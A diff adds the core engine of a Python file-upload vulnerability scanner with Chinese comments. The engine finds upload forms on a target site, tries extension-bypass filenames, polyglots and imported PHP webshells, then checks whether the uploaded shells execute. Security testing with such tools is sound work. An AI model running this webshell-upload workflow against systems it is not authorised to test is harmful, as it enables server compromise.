@@ -1,0 +1,349 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+上传扫描器 - 核心扫描引擎
+"""
+
+import os
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib.parse import urljoin
+
+try:
+    from .http_client import HTTPClient
+    from .form_parser import FormParser
+    from .response_analyzer import ResponseAnalyzer
+    from ..payloads.webshells import WebShellGenerator
+    from ..payloads.bypass_payloads import BypassPayloadGenerator
+    from ..payloads.polyglots import PolyglotGenerator
+except ImportError:
+    from core.http_client import HTTPClient
+    from core.form_parser import FormParser
+    from core.response_analyzer import ResponseAnalyzer
+    from payloads.webshells import WebShellGenerator
+    from payloads.bypass_payloads import BypassPayloadGenerator
+    from payloads.polyglots import PolyglotGenerator
+
+
+class UploadScanner:
+    """文件上传漏洞扫描器"""
+    
+    def __init__(self, target_url, proxy=None, timeout=30, threads=5, delay=0,
+                 cookies=None, headers=None):
+        self.target_url = target_url
+        self.proxy = proxy
+        self.timeout = timeout
+        self.threads = threads
+        self.delay = delay
+        
+        # 初始化组件
+        self.http_client = HTTPClient(timeout=timeout, proxy=proxy, delay=delay)
+        self.form_parser = FormParser(self.http_client)
+        self.response_analyzer = ResponseAnalyzer()
+        self.shell_generator = WebShellGenerator()
+        self.bypass_generator = BypassPayloadGenerator()
+        self.polyglot_generator = PolyglotGenerator()
+        
+        # 设置认证信息
+        if cookies:
+            self.http_client.set_cookie(cookies)
+        if headers:
+            for key, value in headers.items():
+                self.http_client.set_header(key, value)
+        
+        # 扫描结果
+        self.results = []
+        self.forms = []
+        self.is_running = False
+        self.progress_callback = None
+        
+        # 统计信息
+        self.stats = {
+            "total_tests": 0,
+            "successful_uploads": 0,
+            "failed_uploads": 0,
+            "errors": 0,
+            "start_time": None,
+            "end_time": None
+        }
+    
+    def set_progress_callback(self, callback):
+        """设置进度回调函数"""
+        self.progress_callback = callback
+    
+    def _update_progress(self, message, percent=None):
+        """更新进度"""
+        if self.progress_callback:
+            self.progress_callback(message, percent)
+    
+    def discover_forms(self):
+        """发现上传表单"""
+        self._update_progress("正在发现上传表单...", 10)
+        
+        self.forms = self.form_parser.find_upload_forms(self.target_url)
+        
+        self._update_progress(f"发现 {len(self.forms)} 个上传表单", 20)
+        
+        return self.forms
+    
+    def scan_form(self, form_info, test_config=None):
+        """扫描单个表单"""
+        if test_config is None:
+            test_config = {
+                "test_extensions": [".php", ".asp", ".aspx", ".jsp"],
+                "test_bypass": True,
+                "test_polyglots": True,
+                "test_webshells": True
+            }
+        
+        results = []
+        
+        # 获取表单信息
+        action = form_info.get("action", self.target_url)
+        method = form_info.get("method", "POST")
+        file_fields = form_info.get("file_fields", [])
+        other_fields = form_info.get("other_fields", {})
+        
+        if not file_fields:
+            return results
+        
+        file_field = file_fields[0]["name"]  # 使用第一个文件字段
+        
+        # 测试基础上传
+        self._update_progress(f"测试表单: {action}", None)
+        
+        # 生成测试payloads
+        payloads = self._generate_test_payloads(test_config)
+        
+        total = len(payloads)
+        for i, payload in enumerate(payloads):
+            if not self.is_running:
+                break
+            
+            try:
+                self._update_progress(
+                    f"测试 {payload.get('filename', 'unknown')} ({i+1}/{total})",
+                    20 + (i / total * 70)
+                )
+                
+                result = self._test_upload(
+                    action, file_field, payload, other_fields
+                )
+                
+                if result:
+                    results.append(result)
+                    
+                    # 检查是否成功上传
+                    if result.get("is_success") and result.get("uploaded_path"):
+                        self.stats["successful_uploads"] += 1
+                        
+                        # 如果是webshell，测试执行
+                        if test_config.get("test_webshells"):
+                            exec_result = self._test_webshell_execution(result)
+                            result["execution_test"] = exec_result
+                
+                self.stats["total_tests"] += 1
+                
+            except Exception as e:
+                self.stats["errors"] += 1
+                results.append({
+                    "error": str(e),
+                    "payload": payload
+                })
+        
+        return results
+    
+    def _generate_test_payloads(self, test_config):
+        """生成测试payloads"""
+        payloads = []
+        
+        extensions = test_config.get("test_extensions", [".php"])
+        
+        # 基础payloads
+        for ext in extensions:
+            payloads.append({
+                "filename": f"test{ext}",
+                "content": b"<?php echo 'test'; ?>",
+                "content_type": "application/octet-stream",
+                "description": f"基础{ext}测试"
+            })
+        
+        # 绕过技术payloads
+        if test_config.get("test_bypass", True):
+            for ext in extensions:
+                bypass_payloads = self.bypass_generator.generate_all_payloads(
+                    "shell", ext
+                )
+                for bp in bypass_payloads:
+                    payloads.append({
+                        "filename": bp["filename"],
+                        "content": b"<?php echo 'test'; ?>",
+                        "content_type": bp.get("content_type", "application/octet-stream"),
+                        "description": bp.get("description", "绕过测试"),
+                        "technique": bp.get("technique", "unknown"),
+                        "severity": bp.get("severity", "中")
+                    })
+        
+        # Polyglot payloads
+        if test_config.get("test_polyglots", True):
+            polyglots = self.polyglot_generator.get_all_polyglots()
+            for name, info in polyglots.items():
+                try:
+                    content = info["generator"]()
+                    payloads.append({
+                        "filename": f"test{name}{info['extension']}",
+                        "content": content if isinstance(content, bytes) else content.encode(),
+                        "content_type": "application/octet-stream",
+                        "description": info["description"],
+                        "technique": "polyglot",
+                        "severity": "高"
+                    })
+                except Exception as e:
+                    print(f"生成polyglot失败 {name}: {e}")
+        
+        # Webshell payloads
+        if test_config.get("test_webshells", True):
+            shells = self.shell_generator.get_php_shells()
+            for name, info in shells.items():
+                if name in ["simple_eval", "post_eval", "get_shell"]:
+                    payloads.append({
+                        "filename": f"shell_{name}.php",
+                        "content": info["code"].encode(),
+                        "content_type": "application/octet-stream",
+                        "description": info["name"],
+                        "technique": "webshell",
+                        "severity": "高",
+                        "usage": info.get("usage", "")
+                    })
+        
+        return payloads
+    
+    def _test_upload(self, url, field_name, payload, other_fields):
+        """测试单个上传"""
+        filename = payload.get("filename", "test.txt")
+        content = payload.get("content", b"")
+        content_type = payload.get("content_type", "application/octet-stream")
+        
+        headers = {}
+        if "magic_bytes" in payload:
+            content = payload["magic_bytes"] + content
+        
+        response = self.http_client.upload_bytes(
+            url, field_name, content, filename,
+            data=other_fields, headers=headers, content_type=content_type
+        )
+        
+        analysis = self.response_analyzer.analyze(response, filename)
+        
+        result = {
+            "filename": filename,
+            "description": payload.get("description", ""),
+            "technique": payload.get("technique", "direct"),
+            "severity": payload.get("severity", "低"),
+            "analysis": analysis
+        }
+        
+        return result
+    
+    def _test_webshell_execution(self, upload_result):
+        """测试webshell是否可执行"""
+        full_url = upload_result.get("analysis", {}).get("full_url")
+        
+        if not full_url:
+            return None
+        
+        # 尝试访问上传的文件
+        response = self.http_client.get(full_url)
+        
+        execution_test = self.response_analyzer.check_webshell_execution(response)
+        
+        return execution_test
+    
+    def scan(self, test_config=None):
+        """执行完整扫描"""
+        self.is_running = True
+        self.stats["start_time"] = time.time()
+        
+        self._update_progress("开始扫描...", 0)
+        
+        # 发现表单
+        if not self.forms:
+            self.discover_forms()
+        
+        if not self.forms:
+            self._update_progress("未发现上传表单", 100)
+            return []
+        
+        # 扫描每个表单
+        all_results = []
+        for i, form in enumerate(self.forms):
+            if not self.is_running:
+                break
+            
+            self._update_progress(f"扫描表单 {i+1}/{len(self.forms)}", 30 + i * 10)
+            
+            results = self.scan_form(form, test_config)
+            all_results.extend(results)
+            
+            form["scan_results"] = results
+        
+        self.stats["end_time"] = time.time()
+        self.is_running = False
+        
+        self._update_progress("扫描完成", 100)
+        
+        self.results = all_results
+        return all_results
+    
+    def stop(self):
+        """停止扫描"""
+        self.is_running = False
+        self._update_progress("扫描已停止", 100)
+    
+    def get_statistics(self):
+        """获取统计信息"""
+        if self.stats["start_time"] and self.stats["end_time"]:
+            duration = self.stats["end_time"] - self.stats["start_time"]
+        else:
+            duration = 0
+        
+        return {
+            **self.stats,
+            "duration": duration,
+            "forms_found": len(self.forms),
+            "results_count": len(self.results)
+        }
+    
+    def get_vulnerable_uploads(self):
+        """获取存在漏洞的上传结果"""
+        vulnerable = []
+        
+        for result in self.results:
+            analysis = result.get("analysis", {})
+            
+            # 检查是否成功上传webshell
+            if analysis.get("is_success"):
+                execution_test = result.get("execution_test", {})
+                if execution_test and execution_test.get("is_executable"):
+                    vulnerable.append(result)
+                elif result.get("technique") == "webshell":
+                    vulnerable.append(result)
+        
+        return vulnerable
+    
+    def verify_upload(self, uploaded_url):
+        """验证上传文件是否可访问"""
+        response = self.http_client.get(uploaded_url)
+        
+        if isinstance(response, dict):
+            return False, response.get("error", "Unknown error")
+        
+        return response.status_code == 200, {
+            "status_code": response.status_code,
+            "content_length": len(response.content)
+        }
+    
+    def close(self):
+        """清理资源"""
+        self.http_client.close()
